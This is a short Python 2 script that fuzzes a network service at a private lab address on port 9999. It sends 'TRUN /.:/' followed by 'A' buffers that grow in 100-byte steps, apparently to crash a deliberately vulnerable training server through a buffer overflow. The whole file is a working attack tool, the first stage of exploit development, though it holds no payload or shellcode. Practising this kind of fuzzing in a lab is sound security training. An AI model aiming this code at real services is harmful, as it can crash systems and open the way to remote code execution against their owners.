#!/usr/bin/python

import socket
import os
import sys

host="192.168.234.129"
port=9999

buffer=["A"]
counter=100
while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+100

for string in buffer:
  print "Fuzzing Connection with %s bytes" % len(string)
  send = "TRUN /.:/" + string
  expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  expl.connect((host, port))
  expl.send(send)
  expl.close()